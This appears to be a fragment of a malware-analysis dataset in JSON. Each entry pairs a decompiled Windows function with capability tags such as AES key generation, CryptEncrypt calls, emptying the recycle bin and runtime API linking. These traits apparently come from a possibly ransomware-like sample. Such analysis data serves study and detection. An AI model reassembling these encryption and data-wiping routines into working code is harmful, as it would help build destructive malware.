        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043e210(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h;\n    \n    arg_8h = 8;\n    fcn.0043acd3();\n    *(unaff_EBP + -0x10) = 0x495834;\n    fcn.0043d853();\n    iVar2 = *0x4957cc;\n    *(unaff_EBP + -4) = 0;\n    if (iVar2 == 0) {\n        iVar2 = fcn.0043a4f7(0x90, arg_8h);\n        *(unaff_EBP + -0x14) = iVar2;\n        *(unaff_EBP + -4) = 1;\ncode_r0x0043e2e5:\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.0043d964();\n        }\n        *(unaff_EBP + -4) = 0;\n        LOCK();\n        *(iVar2 + 4) = *(iVar2 + 4) + 1;\n        *0x4957cc = fcn.0043d5a1(iVar2);\n    }\n    else {\n        iVar2 = fcn.0043d5a1(iVar2);\n        piVar1 = iVar2 + 4;\n        do {\n            iVar2 = *piVar1;\n            if (iVar2 == 0) {\n                iVar2 = fcn.0043a4f7(0x90, arg_8h);\n                *(unaff_EBP + -0x14) = iVar2;\n                *(unaff_EBP + -4) = 2;\n                goto code_r0x0043e2e5;\n            }\n            LOCK();\n            if (iVar2 == *piVar1) {\n                *piVar1 = iVar2 + 1;\n                iVar3 = iVar2;\n            }\n            else {\n                iVar3 = *piVar1;\n            }\n        } while (iVar3 != iVar2);\n    }\n    *0x495834 = 0;\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 537
    },
    "0044328b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0044328b(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_10h;\n    \n    arg_10h = 8;\n    fcn.0043acd3();\n    *(unaff_EBP + -0x14) = 0x495824;\n    fcn.0043d853();\n    *(unaff_EBP + -4) = 0;\n    if (*0x4957fc == NULL) {\ncode_r0x004432cc:\n        fcn.00447322(unaff_EBP + -0x10, 0, arg_10h);\n        iVar2 = *0x495800;\n        *(unaff_EBP + -4) = 1;\n        if (iVar2 != 0) {\n            fcn.004473c5(iVar2);\n        }\n        *0x4957fc = fcn.00442bc7(unaff_EBP + -0x10);\n        fcn.0044386b();\n        pcVar3 = *(**0x4957fc + 0x10);\n        (**0x4742a4)();\n        (*pcVar3)();\n        fcn.004473b9();\n    }\n    else {\n        piVar1 = *0x4957fc + 0x60;\n        do {\n            iVar2 = *piVar1;\n            if (iVar2 == 0) goto code_r0x004432cc;\n            LOCK();\n            if (iVar2 == *piVar1) {\n                *piVar1 = iVar2 + 1;\n                iVar4 = iVar2;\n            }\n            else {\n                iVar4 = *piVar1;\n            }\n        } while (iVar4 != iVar2);\n    }\n    *0x495824 = 0;\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 463
    },
    "00445d80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445d80(uint *arg_8h)\n\n{\n    uint *arg_8h_00;\n    \n    while (arg_8h != NULL) {\n        arg_8h_00 = arg_8h + -6;\n        arg_8h = *arg_8h;\n        fcn.004455c4(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00446291": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t ** __cdecl fcn.00446291(int32_t **arg_8h, int32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t in_ECX;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    uint var_4h;\n    \n    ppiVar1 = *(*(in_ECX + 8) + arg_ch * 4);\n    if (ppiVar1 != NULL) {\n        ppiVar3 = NULL;\n        do {\n            ppiVar2 = ppiVar1;\n            ppiVar1 = *ppiVar2;\n            if (ppiVar2[1] == *arg_8h) {\n                if (ppiVar3 == NULL) {\n                    *(*(in_ECX + 8) + arg_ch * 4) = ppiVar1;\n                }\n                else {\n                    *ppiVar3 = ppiVar1;\n                }\n                *(in_ECX + 4) = *(in_ECX + 4) + -1;\n                return ppiVar2;\n            }\n            ppiVar3 = ppiVar2;\n        } while (ppiVar1 != NULL);\n    }\n    return NULL;\n}\n",
        "token_count": 264
    },
    "00456b7b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00456b7b(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (param_1 == 0) {\n        iVar1 = fcn.0046186a(param_2);\n    }\n    else {\n        if (param_2 == 0) {\n            fcn.004612d2(param_1);\n        }\n        else {\n            if (param_2 < 0xffffffe1) {\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x496134, 0, param_1, param_2);\n                    if (iVar1 != 0) {\n                        return iVar1;\n                    }\n                    iVar1 = fcn.00460c8a();\n                } while ((iVar1 != 0) && (iVar1 = fcn.0045e720(param_2),  iVar1 != 0));\n            }\n            puVar2 = fcn.0045652e();\n            *puVar2 = 0xc;\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 256
    },
    "0045c518": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045c518(void)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    char **ppcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *piVar9;\n    char **ppcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    int16_t **ppiVar13;\n    int32_t iStack44;\n    int32_t iStack40;\n    char cStack32;\n    uint32_t uStack28;\n    char *pcStack20;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    fcn.004562ff(0);\n    pcStack20 = NULL;\n    pcVar11 = 0x164;\n    iStack12 = 0;\n    ppcVar4 = *(iStack40 + 0x9c);\n    iStack16 = 0;\n    do {\n        pcVar12 = pcVar11;\n        if (iStack12 == 1) {\n            iVar6 = fcn.0046186a(pcVar11);\n            iStack16 = 0;\n            if (iVar6 == 0) break;\n            fcn.00452000(iVar6, 0, pcVar11);\n            pcVar12 = 0x164;\n            pcStack20 = pcVar11;\n            iStack16 = iVar6;\n        }\n        iVar6 = iStack16 - ppcVar4;\n        uStack28 = 0;\n        ppcVar10 = ppcVar4;\n        do {\n            if (iStack12 == 1) {\n                *(iVar6 + ppcVar10) = pcVar12 + iStack16;\n                iVar7 = fcn.00461178(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            uStack28 = uStack28 + 1;\n            ppcVar10 = ppcVar10 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 7;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.00461178(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 0xe;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.00461178(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 0x1a;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.00461178(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 0x26;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.00461178(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 2);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xa0) = pcVar12 + iStack16;\n            iVar7 = fcn.00461178(pcVar12 + iStack16, pcStack20 - pcVar12, ppcVar4[0x28]);\n            if (iVar7 != 0) goto code_r0x0045e0d0;\n        }\n        pcVar8 = ppcVar4[0x28];\n        pcVar11 = pcVar8 + 1;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\n        pcVar8 = pcVar8 + pcVar12 + (1 - pcVar11);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xa4) = pcVar8 + iStack16;\n            iVar7 = fcn.00461178(pcVar8 + iStack16, pcStack20 - pcVar8, ppcVar4[0x29]);\n            if (iVar7 != 0) goto code_r0x0045e0d0;\n        }\n        pcVar12 = ppcVar4[0x29];\n        pcVar11 = pcVar12 + 1;\n        do {\n            cVar2 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar2 != '\\0');\n        pcVar12 = pcVar12 + pcVar8 + (1 - pcVar11);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xa8) = pcVar12 + iStack16;\n            iVar7 = fcn.00461178(pcVar12 + iStack16, pcStack20 - pcVar12, ppcVar4[0x2a]);\n            if (iVar7 != 0) goto code_r0x0045e0d0;\n        }\n        pcVar11 = ppcVar4[0x2a];\n        pcVar8 = pcVar11 + 1;\n        do {\n            cVar2 = *pcVar11;\n            pcVar11 = pcVar11 + 1;\n        } while (cVar2 != '\\0');\n        pcVar11 = pcVar11 + pcVar12 + (1 - pcVar8);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xac) = ppcVar4[0x2b];\n            *(iStack16 + 0xb0) = 0;\n        }\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x2d;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x34;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x3b;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x47;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x53;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.0045c065(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x0045e0d0;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 2);\n        for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x154) = iVar6;\n            iVar6 = fcn.0045c065(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x55]);\n            if (iVar6 != 0) goto code_r0x0045e0d0;\n        }\n        piVar9 = ppcVar4[0x55];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x158) = iVar6;\n            iVar6 = fcn.0045c065(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x56]);\n            if (iVar6 != 0) goto code_r0x0045e0d0;\n        }\n        piVar9 = ppcVar4[0x56];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x15c) = iVar6;\n            iVar6 = fcn.0045c065(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x57]);\n            if (iVar6 != 0) goto code_r0x0045e0d0;\n        }\n        piVar9 = ppcVar4[0x57];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x160) = iVar6;\n            iVar6 = fcn.0045c065(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x58]);\n            if (iVar6 != 0) {\ncode_r0x0045e0d0:\n                fcn.00455a0a(0, 0, 0, 0, 0);\n                pcVar5 = swi(3);\n                iVar6 = (*pcVar5)();\n                return iVar6;\n            }\n        }\n        piVar9 = ppcVar4[0x58];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        iStack12 = iStack12 + 1;\n        pcVar11 = pcVar11 + ((piVar9 - piVar1 >> 1) + 1) * 2;\n    } while (iStack12 < 2);\n    if (cStack32 != '\\0') {\n        *(iStack44 + 0x350) = *(iStack44 + 0x350) & 0xfffffffd;\n    }\n    return iStack16;\n}\n",
        "token_count": 4407
    },
    "0040ab90": {
        "rules": [
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ab90(uint hKey, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_8h = arg_10h;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(hKey, 0, arg_ch, 0, 0, &var_8h, 0);\n    if (iVar1 == 0) {\n        var_8h = 0;\n    }\n    fcn.0043a2e7(hKey);\n    return;\n}\n",
        "token_count": 164
    },
    "0040abf0": {
        "rules": [
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040abf0(uint hKey, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    puVar4 = &arg_14h;\n    uVar3 = 0;\n    uVar5 = arg_18h;\n    uVar2 = fcn.00405270(0);\n    uVar1 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(hKey, 0, arg_ch, 0, uVar2, uVar3, puVar4, uVar5, uVar1);\n    *in_FS_OFFSET = var_ch;\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 288
    },
    "0040bff0": {
        "rules": [
            "encrypt data using AES via WinAPI"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.0040bff0(uint phKey)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = (*_sym.imp.ADVAPI32.dll_CryptGenKey)(*(in_ECX + 8), 0x6610, 1, phKey);\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 123
    },
    "0041c580": {
        "rules": [
            "empty the recycle bin"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint32_t __fastcall fcn.0041c580(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar1 = (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinW)(0, 0, 7, param_1);\n    var_4h = uVar1 == 0;\n    return uVar1 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 124
    },
    "0043cfdd": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0043cfdd(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t arg_8h;\n    uint32_t arg_8h_00;\n    uint var_10h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"kernel32.dll\");\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, \"SetThreadGroupAffinity\");\n    arg_8h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, \"GetThreadGroupAffinity\");\n    if ((iVar3 == 0) || (arg_8h == 0)) {\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        *0x49579c = fcn.0043d5a1(iVar3);\n        *0x4957a0 = fcn.0043d5a1(arg_8h);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"kernel32.dll\", \"GetCurrentProcessorNumberEx\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        if (iVar3 != 0) {\n            *0x495798 = fcn.0043d5a1(iVar3);\n            return;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    if (0 < arg_8h_00) {\n        arg_8h_00 = arg_8h_00 & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h_00);\n    fcn.00451487(&var_10h, 0x48de6c);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 427
    },
    "0043d21c": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043d21c(uint arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    int32_t iVar4;\n    uint *arg_8h_01;\n    uint var_10h;\n    uint var_ch;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"kernel32.dll\", \"GetLogicalProcessorInformationEx\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 == NULL) {\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        (**0x4742a4)(arg_8h, 0, arg_ch);\n        (*pcVar2)();\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 == 0x7a) {\n            iVar3 = fcn.00455a3e(*arg_ch);\n            if (iVar3 == 0) {\n                fcn.004255d9();\n                uVar1 = 0x48c8fc;\n                arg_8h_01 = &var_ch;\n                goto code_r0x0043d2cb;\n            }\n            (**0x4742a4)(arg_8h, iVar3, arg_ch);\n            iVar4 = (*pcVar2)();\n            if (iVar4 != 0) {\n                return iVar3;\n            }\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    if (0 < arg_8h_00) {\n        arg_8h_00 = arg_8h_00 & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h_00);\n    uVar1 = 0x48de6c;\n    arg_8h_01 = &var_10h;\ncode_r0x0043d2cb:\n    fcn.00451487(arg_8h_01, uVar1);\n    pcVar2 = swi(3);\n    iVar3 = (*pcVar2)();\n    return iVar3;\n}\n",
        "token_count": 504
    },
    "004490bd": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint fcn.004490bd(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    uint var_10h;\n    \n    *0x495840 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(L\"combase.dll\", 0, 0x800);\n    if (*0x495840 == 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"combase.dll\", \"RoInitialize\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        if (iVar3 != 0) {\n            *0x495838 = fcn.0043d5a1(iVar3);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"combase.dll\", \"RoUninitialize\");\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            if (iVar3 != 0) {\n                *0x49583c = fcn.0043d5a1(iVar3);\n                uVar2 = *0x495844;\n                *0x495844 = 1;\n                return uVar2;\n            }\n        }\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    if (0 < arg_8h) {\n        arg_8h = arg_8h & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h);\n    fcn.00451487(&var_10h, 0x48de6c);\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 417
    },
    "0043d4ec": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d4ec(uint dwTlsIndex)\n\n{\n    (*_sym.imp.KERNEL32.dll_TlsGetValue)(dwTlsIndex);\n    return;\n}\n",
        "token_count": 41
    },
    "0043d4fa": {
        "rules": [
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d4fa(uint dwTlsIndex, uint lpTlsValue)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t arg_8h;\n    uint var_10h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(dwTlsIndex, lpTlsValue);\n    if (iVar2 != 0) {\n        return;\n    }\n    arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (0 < arg_8h) {\n        arg_8h = arg_8h & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h);\n    fcn.00451487(&var_10h, 0x48de6c);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 202
    }
}